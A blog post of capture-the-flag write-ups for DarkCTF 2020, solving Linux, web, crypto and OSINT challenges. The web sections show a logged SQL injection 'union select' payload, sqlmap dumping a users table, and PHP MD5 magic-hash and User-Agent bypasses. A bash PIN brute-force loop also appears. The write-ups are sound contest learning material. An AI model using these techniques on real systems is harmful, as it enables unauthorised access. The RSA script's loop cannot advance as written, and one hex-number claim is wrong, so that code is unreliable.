---
author: george_pick
layout: post
title: "DarkCTF 2020"
excerpt: "Writeups for various challenges I solved during the 2020 DarkCTF capture the flag competition."
categories: [Capture The Flag]
---

> Jeopardy Style International CTF  
> The 1st CTF organised by [DarkArmy](https://ctftime.org/team/26569)


| Linux | Web    | Crypto | Misc | Forensics | OSINT |
|-------|--------|--------|----------|-----------|
| [Linux Starter](#linux-starter)| [Source](#source) | [Pipe Rhyme](#pipe-rhyme) | [Minetest 1](#minetest-1) | [AW](#aw) | [Find Cell](#find-cell)
| [Secret Vault](#secret-vault)| [Apache Logs](#apache-logs) | [Easy RSA](#easy-rsa) | | | |
| [Time Eater](#time-eater)| [Simple_SQL](#simple_sql) | | | | |
| | [PHP Information](#php-information) | | | | |
|---

# Linux

## Linux Starter
> Don't Try to break this jail
>
> `ssh wolfie@linuxstarter.darkarmy.xyz -p 8001` password : `wolfie`

SSH to the box, and we land at a normal terminal prompt. Trying some commands like `ls`, `echo`, `cat`, etc, we don't seem to be in any sort of restricted shell, so we can take a look around.

{% highlight bash %}
wolfie@9ad161dbc9ce:~$ ls -alrt
total 36
drwxr-xr-x 1 root   root   4096 Sep 25 19:14 ..
drwxr-xr-x 1 root   root   4096 Sep 25 19:14 imp
drwxr-xr-x 1 root   root   4096 Sep 25 19:14 bin
drwx------ 2 wolfie wolfie 4096 Sep 27 06:14 .cache
-rw-rw-r-- 1 wolfie wolfie    0 Sep 27 11:57 .ashrc
-rw-rw-r-- 1 wolfie wolfie    0 Sep 27 11:57 .bashrc
drwxr-xr-x 1 wolfie wolfie 4096 Sep 27 11:57 .
-rw------- 1 wolfie wolfie 5256 Sep 29 12:45 .bash_history
wolfie@9ad161dbc9ce:~$ ls -alrt bin/
total 12
lrwxrwxrwx 1 root   root      8 Sep 25 19:14 cat -> /bin/cat
drwxr-xr-x 1 root   root   4096 Sep 25 19:14 .
drwxr-xr-x 1 wolfie wolfie 4096 Sep 27 11:57 ..
wolfie@9ad161dbc9ce:~$ ls -alrt imp/
total 16
-rw-r--r-- 1 root   root     36 Sep 24 06:55 flag.txt
drwxr-xr-x 1 root   root   4096 Sep 25 19:14 .
drwxr-xr-x 1 wolfie wolfie 4096 Sep 27 11:57 ..
wolfie@9ad161dbc9ce:~$ cat imp/flag.txt
darkCTF{h0pe_y0u_used_intended_w4y}
{% endhighlight %}

Huh - wonder if that was the _intended_ way but it sure was easy.

Flag is `darkCTF{h0pe_y0u_used_intended_w4y}`.

## Secret Vault
> There's a vault hidden find it and retrieve the information. Note: Do not use any automated tools.
>
> ssh ctf@vault.darkarmy.xyz -p 10000
>
> Alternate: ssh ctf@13.126.135.177 -p 10000 password: wolfie

Attaching to the endpoint, we don't find anything in our user's default home directory.

Looking around (always use `-alrt` on your ls', kids!), we find a `.secretdoor` directory one dir up from our user's home door, which contains a binary called `vault`.

{% highlight bash %}
ssh ctf@vault.darkarmy.xyz -p 10000
# …
dark@491454fa2b59:/home/dark$ ls ../.secretdoor/vault
/home/.secretdoor/vault
{% endhighlight %}

If we try running it, it seems like it is requiring some kind of input:
{% highlight bash %}
dark@491454fa2b59:/home/dark$ /home/.secretdoor/vault
wrong pin: (null)

dark@491454fa2b59:/home/dark$ /home/.secretdoor/vault 1
wrong pin: 1
{% endhighlight %}

OK, so seems like we need to brute force a PIN value in order to be able to successfully access the vault. Hoping that they really meant _pin_ when they said pin (i.e a four digit, numerical value only), I decided to just try brute forcing every value from 0000 through 9999.

{% highlight bash %}
for i in {0000..9999}; do
  /home/.secretdoor/vault $i | grep -v wrong && echo "PIN: $i"
done
{% endhighlight %}

The pin ended up being `8794`. Running the binary but with this as the pin, we get:

```
Vault Unlocked :A79Lo6W?O%;D;Qh1NIbJ0lp]#F^no;F)tr9Ci!p(+X)7@
```

The leading `:` threw me off for a while, since it otherwise looked like valid base85. Eventually, I tried without the leading `:` since that was likely part of the print statement, and poof, we get our flag after base85 decoding it.

Flag is `darkCTF{R0bb3ry_1s_Succ3ssfullll!!}`.

## Time Eater
> This room requires account on Try Hack Me tryhackme.com/jr/darkctflo
>
> Note: submit the root flag here.

See [my teammate Datajerk's writeup for this challenge](https://github.com/datajerk/ctf-write-ups/tree/master/darkctf2020/time_eater), it was a nice split of work where he got the SSH login brute forced, and I took over to get the work done to actually get the flag on the server.

Flag is `darkCTF{Escalation_using_D0cker_1ss_c00l}`.

# Web
## Source
> Don't know source is helpful or not !!
>
> http://web.darkarmy.xyz
> [File](https://github.com/bigpick/CaptureTheFlagCode/tree/master/darkCTF2020/index(1).php)

We're given the source file of the webpage running via the file attachment:

{% highlight html %}
<html>
    <head>
        <title>SOURCE</title>
        <style>
            #main {
    height: 100vh;
}
        </style>
    </head>
    <body><center>
<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
<?php
$web = $_SERVER['HTTP_USER_AGENT'];
if (is_numeric($web)){
      if (strlen($web) < 4){
          if ($web > 10000){
                 echo ('<div class="w3-panel w3-green"><h3>Correct</h3>
  <p>darkCTF{}</p></div>');
          } else {
                 echo ('<div class="w3-panel w3-red"><h3>Wrong!</h3>
  <p>Ohhhhh!!! Very Close  </p></div>');
          }
      } else {
             echo ('<div class="w3-panel w3-red"><h3>Wrong!</h3>
  <p>Nice!!! Near But Far</p></div>');
      }
} else {
    echo ('<div class="w3-panel w3-red"><h3>Wrong!</h3>
  <p>Ahhhhh!!! Try Not Easy</p></div>');
}
?>
</center>
<!-- Source is helpful -->
    </body>
</html>
{% endhighlight %}

So we can see that there are some qualifications we need to pass in order to get the flag. Looking at the source, we see the value is read in via the caller's `user-agent`, via:

{% highlight html %}
$web = $_SERVER['HTTP_USER_AGENT'];
{% endhighlight %}

In order to get the flag, it must:

1. Satisfy `is_numeric()` (i.e qualify as a number)
2. Satisfy `strlen() < 4` (i.e be 3 digits or less)
3. Satisfy `> 10000` (i.e be a large decimal value).

Initial thoughts for some might be "Hey, I can't do that with only three digits!". But, smarter folks may think, "Hm, maybe there are _other_ ways to represent a number of a set value, other than decimal??" And that is what the answer is! At first, I tried `INF` but that didn't seem to work. Luckily, `0x1e06` is a number, and just happens to satisfy all three checks above! We just drop the leading `0` in front of the 6, so set your user-agent to `1e6` and then make the request to get the flag (we did so via intercepting in Burp Proxy). Though, you could also use cURL like so:

{% highlight bash %}
curl -H "User-Agent: 1e6" http://web.darkarmy.xyz/
{% endhighlight %}

which yields:

{% highlight html %}
<html>
    <head>
        <title>SOURCE</title>
        <style>
            #main {
    height: 100vh;
}
        </style>
    </head>
    <body><center>
<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
<div class="w3-panel w3-green"><h3>Correct</h3>
  <p>darkCTF{changeing_http_user_agent_is_easy}</p></div></center>
<!-- Source is helpful -->
    </body>
</html>
{% endhighlight %}

Flag is `darkCTF{changeing_http_user_agent_is_easy}`.

## Apache Logs
> Our servers were compromised!! Can you figure out which technique they used by looking at Apache access logs.
>
> flag format: DarkCTF{}
>
> [Files](https://github.com/bigpick/CaptureTheFlagCode/tree/master/darkCTF2020/APACHE_LOGS.zip)

We're given a dump of log files. Sifting through the log entries, there's quite a bit of noise (looks like it's output from the Damn Vulnerable Web App and another, Mutillidae.

Towards the bottom, we see some attempts that start looking like SQL injection attempts, leading up to this suspiciously long query:

```
192.168.32.1 - - [29/Sep/2015:03:39:46 -0400] "GET /mutillidae/index.php?page=client-side-control-challenge.php HTTP/1.1" 200 9197 "http://192.168.32.134/mutillidae/index.php?page=user-info.php&username=%27+union+all+select+1%2CString.fromCharCode%28102%2C%2B108%2C%2B97%2C%2B103%2C%2B32%2C%2B105%2C%2B115%2C%2B32%2C%2B68%2C%2B97%2C%2B114%2C%2B107%2C%2B67%2C%2B84%2C%2B70%2C%2B123%2C%2B53%2C%2B113%2C%2B108%2C%2B95%2C%2B49%2C%2B110%2C%2B106%2C%2B51%2C%2B99%2C%2B116%2C%2B49%2C%2B48%2C%2B110%2C%2B125%29%2C3+--%2B&password=&user-info-php-submit-button=View+Account+Details" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
```

The `String.fromCharCode` resulting string is the following:

{% highlight python %}
>>> for num in '102 108 97 103 32 105 115 32 68 97 114 107 67 84 70 123 53 113 108 95 49 110 106 51 99 116 49 48 110 125'.split():
...   print(chr(int(num)), end='')
...
flag is DarkCTF{5ql_1nj3ct10n}
{% endhighlight %}

The flag is `DarkCTF{5ql_1nj3ct10n}`.

## Simple_SQL
> Try to find username and password
>
> http://simplesql.darkarmy.xyz/

Navigating to the site, we just get a totally empty page saying "Welcome Players To My Safe House". Nothing else on the screen. Checking the source code:

{% highlight html %}
<!DOCTYPE html>
<html>
<head>
<title>Simple SQL</title>
<style>

</style>
</head>

<body bgcolor=black>
<center><font color=red class=title>Welcome Players To My Safe House </font></center> <br>


<br><!-- Try id as parameter  -->
</body>
</html>
{% endhighlight %}

_Try id as parameter_ seems suspicious. So, what if we do just that? To do so, just append `?id=xxxxxx` to the url, like so:

* `http://simplesql.darkarmy.xyz/?id=1`.

Which, alas! We get some more output:

> Username : LOL Password : Try

Trying ID's from 1, we see changing responses each time, up until we get to id parameter 9, which yields:

* `http://simplesql.darkarmy.xyz/?id=9`:

  > Username : flag Password : darkCTF{it_is_very_easy_to_find}

Flag is `darkCTF{it_is_very_easy_to_find}`.

## So_Simple
> "Try Harder" may be You get flag manually
>
> Try id as parameter
>
> http://web.darkarmy.xyz:30001

So, similar to [simple SQL](#simple-sql), we get a blank page that returns different responses depending on the `?id=xxx` we pass it. However, this time, trying 1-10 doesn't yield us any flag. In the same vane as Simple SQL, we continued to try IDs (by _we_, I mean `sqlmap` ;) ).

The flag was found on `?id=56465219`:

```
[11:56:47] [INFO] fetching columns for table 'users' in database 'id14831952_security'
[11:56:47] [INFO] retrieved: 'id','int(78)'
[11:56:47] [INFO] retrieved: 'username','varchar(500)'
[11:56:47] [INFO] retrieved: 'password','varchar(500)'
[11:56:47] [INFO] fetching entries for table 'users' in database 'id14831952_security'
[11:56:48] [INFO] retrieved: '1','Try ','LOL'
[11:56:48] [INFO] retrieved: '2','another','Try'
[11:56:48] [INFO] retrieved: '4','dont try to hack','its secure'
[11:56:49] [INFO] retrieved: '5','easy','not'
[11:56:49] [INFO] retrieved: '6','my database','dont read'
[11:56:49] [INFO] retrieved: '7','new','try to think '
[11:56:49] [INFO] retrieved: '8','darkCTF{this_is_not_a_flag}','admin'
[11:56:49] [INFO] retrieved: '56465219','darkCTF{uniqu3_ide4_t0_find_fl4g}','flag'
Database: id14831952_security
Table: users
[8 entries]
+----------+---------------+-----------------------------------+
| id       | username      | password                          |
+----------+---------------+-----------------------------------+
| 1        | LOL           | Try                               |
| 2        | Try           | another                           |
| 4        | its secure    | dont try to hack                  |
| 5        | not           | easy                              |
| 6        | dont read     | my database                       |
| 7        | try to think  | new                               |
| 8        | admin         | darkCTF{this_is_not_a_flag}       |
| 56465219 | flag          | darkCTF{uniqu3_ide4_t0_find_fl4g} |
```

Flag is `darkCTF{uniqu3_ide4_t0_find_fl4g}`.

## PHP information
> Let's test your php knowledge.
>
> Flag Format: DarkCTF{}
>
> http://php.darkarmy.xyz:7001

Navigating to the given site, we just get a highlighted view of the webpage's source code:

{% highlight html %}
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Corona Web</title>
</head>
<body>
    

    <style>
        body{
            background-color: whitesmoke
        }
    </style>
<?php

include "flag.php";

echo show_source("index.php");


if (!empty($_SERVER['QUERY_STRING'])) {
    $query = $_SERVER['QUERY_STRING'];
    $res = parse_str($query);
    if (!empty($res['darkctf'])){
        $darkctf = $res['darkctf'];
    }
}

if ($darkctf === "2020"){
    echo "<h1 style='color: chartreuse;'>Flag : $flag</h1></br>";
}

if ($_SERVER["HTTP_USER_AGENT"] === base64_decode("MjAyMF90aGVfYmVzdF95ZWFyX2Nvcm9uYQ==")){
    echo "<h1 style='color: chartreuse;'>Flag : $flag_1</h1></br>";
}


if (!empty($_SERVER['QUERY_STRING'])) {
    $query = $_SERVER['QUERY_STRING'];
    $res = parse_str($query);
    if (!empty($res['ctf2020'])){
        $ctf2020 = $res['ctf2020'];
    }
    if ($ctf2020 === base64_encode("ZGFya2N0Zi0yMDIwLXdlYg==")){
        echo "<h1 style='color: chartreuse;'>Flag : $flag_2</h1></br>";
                
        }
    }



    if (isset($_GET['karma']) and isset($_GET['2020'])) {
        if ($_GET['karma'] != $_GET['2020'])
        if (md5($_GET['karma']) == md5($_GET['2020']))
            echo "<h1 style='color: chartreuse;'>Flag : $flag_3</h1></br>";
        else
            echo "<h1 style='color: chartreuse;'>Wrong</h1></br>";
    }



?>
</body>
</html> 1
{% endhighlight %}

So, we're going to have to get the flag parts (`$flag`, `$flag_1`, `$flag_2`, `$flag_3`) by satisfying different if statements. We can walk through the relatively conditions to get the flag.

First, for `$flag`, just set the query string for `darkctf` to `2020`:

{% highlight bash %}
curl http://php.darkarmy.xyz:7001\?darkctf\=2020
{% endhighlight %}

Which gives:

{% highlight html %}
<!-- ... -->
</code>1<h1 style='color: chartreuse;'>Flag : DarkCTF{</h1></br></body>
{% endhighlight %}

OK - easy enough. For `$flag_1`, the user-agent string must `=== base64_decode("MjAyMF90aGVfYmVzdF95ZWFyX2Nvcm9uYQ==")`. OK , so we can just do so like this:

{% highlight bash %}
curl -H "User-Agent: $(echo MjAyMF90aGVfYmVzdF95ZWFyX2Nvcm9uYQ== | base64 -d)" http://php.darkarmy.xyz:7001
{% endhighlight %}

which gives us the first part of the flag text:

{% highlight html %}
<!-- ... -->
</code>1<h1 style='color: chartreuse;'>Flag : very_</h1></br></body>
{% endhighlight %}

For the middle part (`$flag2`), our query string (for `ctf2020`) must be `=== base64_encode("ZGFya2N0Zi0yMDIwLXdlYg=="`.

So we can do that like so:

{% highlight bash %}
curl "http://php.darkarmy.xyz:7001?ctf2020=$(echo -n ZGFya2N0Zi0yMDIwLXdlYg== | base64)"
{% endhighlight %}

which gives us the second part of the flag text:

{% highlight html %}
<!-- ... -->
</code>1<h1 style='color: chartreuse;'>Flag : nice</h1></br></body>
{% endhighlight %}

The last check to pass is that we must pass two separate query parameters, for `karma` and `2020`, whose values must be different, but whose MD5's (_per PHP standards_) are equivalent:

{% highlight html %}
    if (isset($_GET['karma']) and isset($_GET['2020'])) {
        if ($_GET['karma'] != $_GET['2020'])
        if (md5($_GET['karma']) == md5($_GET['2020']))
            echo "<h1 style='color: chartreuse;'>Flag : $flag_3</h1></br>";
        else
            echo "<h1 style='color: chartreuse;'>Wrong</h1></br>";
    }
{% endhighlight %}

The latter part is important, because it's a [known fact that MD5 is pretty broken in the PHP world](https://github.com/spaze/hashes/blob/master/md5.md).

Taking just the first two values from that list:

```
240610708:0e462097431906509019562988736854
QLTHNDT:0e405967825401955372549139051580
```

We can use those values for our query params and get the last bit of the flag:

{% highlight bash %}
curl "http://php.darkarmy.xyz:7001?karma=240610708&2020=QLTHNDT"
{% endhighlight %}

Which gives us the last piece.

Flag is `DarkCTF{very_nice_web_challenge_dark_ctf}`.

# Crypto
## Pipe Rhyme
> So special

We're given:

```
Chall:- Pipe Rhyme

Chall Desc:- Wow you are so special.

N=0x3b7c97ceb5f01f8d2095578d561cad0f22bf0e9c94eb35a9c41028247a201a6db95f
e=0x10001
ct=0x1B5358AD42B79E0471A9A8C84F5F8B947BA9CB996FA37B044F81E400F883A309B886
```

Cmon people, repeat after me: [plug and play simple RSA template](https://github.com/bigpick/CaptureTheFlagCode/blob/master/tools/crypto/normal_rsa_python/normal_rsa.py).

Flag is `darkCTF{4v0iD_us1ngg_p1_pr1mes}`

## Easy RSA
> Just a easy and small E-RSA for you :)

We're given:

```
n = [redacted]
e = 3
cipher = 70415348471515884675510268802189400768477829374583037309996882626710413688161405504039679028278362475978212535629814001515318823882546599246773409243791879010863589636128956717823438704956995941
```

OK - so seems like a very minor twist on a classic simple RSA CTF challenge: [a simple cube root attack on RSA since e=3](https://www.johndcook.com/blog/2019/03/06/rsa-exponent-3/).

The twist here is that we don't know n! Not to worry, that shouldn't be an issue, we can just try brute forcing that too!

I used a slightly modified version of a simple RSA cube attack script I found on [w3ndige's awesome blog from one of their PicoCTF 2018 writeups](https://www.rootnetsec.com/picoctf-2018-safe-rsa/) -- seriously, go check some of those out!

{% highlight python %}
#!/bin/python
import gmpy
import sys

e = 3
cipher_str = 70415348471515884675510268802189400768477829374583037309996882626710413688161405504039679028278362475978212535629814001515318823882546599246773409243791879010863589636128956717823438704956995941
gs = gmpy.mpz(cipher_str)
g3 = gmpy.mpz(3)
n = 0
while n <= 0x2f6c2f0f6266f297f890f9246c0b189a702db378d4b021339d995e0c0f03507477cf5ab319206ac6b8141bf3c32071ef0a822018d12f307c9222dff07c0f3556f89327b87e843b29c4567faaea1e6253cd6a647d2ab6679b322a6b32f4bdbb3523c325e027707f6728deaca6914b6cf2456ace3bf848014a511de272c9145f1e042db27380e6dfb823d9eb6a635c885f073ae83b3d19ab7eb4a545cc4e05e336cf8e3d3811d0d501b3fd622a366b52649d66265bb097735e66ac5eef7f1e77aeedf70c58b6f3d1ddcdbc0560177464d8a7750d3f535250e500c3cd7ee03da6851eaee27d5911ec16fc7742b8e15d7f32b137a208ffd05bb9f5275c0f4e64443:
    gm = gmpy.mpz(n)
    mask = gmpy.mpz(0x8080808080808080808080808080808080808080808080808080808080808080808080808080808080808080808080808080808080808080808080808000)
    test = 0
    while True:
        if test == 0:
            gs = gs
        else:
            gs += gm
        root,exact = gs.root(g3)
        if (root & mask).bit_length() < 8:
            print root
            sys.exit(1)
    n += 1

print '\n',hex(int(root))[2:-1].decode('hex')
{% endhighlight %}

Flag is `darkCTF{5m4111111_3_4tw_xD}`.

# Misc
## Minetest 1
> ``` Just a sanity check to see whether you installed Minetest successfully and got into the game

Download [Minetest](https://www.minetest.net/downloads/); open up the given world file and activate the circuit for the flag to be printed.

Alternatively, activate Fly mode and fly under the map to directly inspect the command block, which you can just manually hit to get the flag ;)

Flag is `DarkCTF{y0u_5ucess_fu11y_1ns7alled_m1n37e57}`.

# Forensics
## AW
> "Hello, hello, Can you hear me, as I scream your Flag!"

Given an audio file. Open in Sonic Visualization/Audacity/whatever and enable spectrogram. Zoom in to get the flag.

![]({{ site.baseurl }}/img/darkctf2020/AW.png){:height="70%" width="70%"}

# OSINT
## Find Cell
> I lost my phone while I was travelling back to home, I was able to get back my eNB ID, MCC and MNC could you help me catch the tower it was last found.  
> note: decimal value upto 1 digit  
> Flag Format : darkCTF{latitude,longitude}

The file we're given has the following:

```
310
410
81907
```

So we can assume that the eNB ID is 81907, and the MCC and MNC are 310 and 410, respectively.

Googling for "cell tower mnc lookup" yields us to a [www.cellmapper.net](https://www.cellmapper.net/map) site.

On the left hand side, we see we are able to select our MCC/MNC provider as 310/410, which happens to be an AT&T Mobility set of values:

![]({{ site.baseurl }}/img/darkctf2020/cellmapper_mnc.png){:height="70%" width="70%"}

However, that still doesn't get us much. Scrolling down the left hand side, we find a box pertaining to _Tower Search_. This seems like what we might want, since we were given the eNB ID, which is [used to uniquely identify towers](http://4g5gworld.com/category/glossary/enb-id).

If we paste the eNB ID in in combo with the 310/410 values, we get a hit!

![]({{ site.baseurl }}/img/darkctf2020/cellmapper_hit.png){:height="70%" width="70%"}

Clicking on that link, we are brought to the tower's exact location. The full lattitude and longitude values can be seen in the URL:

* `https://www.cellmapper.net/map?MCC=310&MNC=410&type=LTE&latitude=32.84644890905747&longitude=-24.554806096440018&zoom=16&showTowers=true&showTowerLabels=true&clusterEnabled=true&tilesEnabled=true&showOrphans=false&showNoFrequencyOnly=false&showFrequencyOnly=false&showBandwidthOnly=false&DateFilterType=None&showHex=false&showVerifiedOnly=false&showUnverifiedOnly=false&showLTECAOnly=false&showENDCOnly=false&showBand=0&showSectorColours=true`

After guessing about rounding the lat/long values, we get the flag.

The flag is `darkCTF{32.8,-24.5}`.


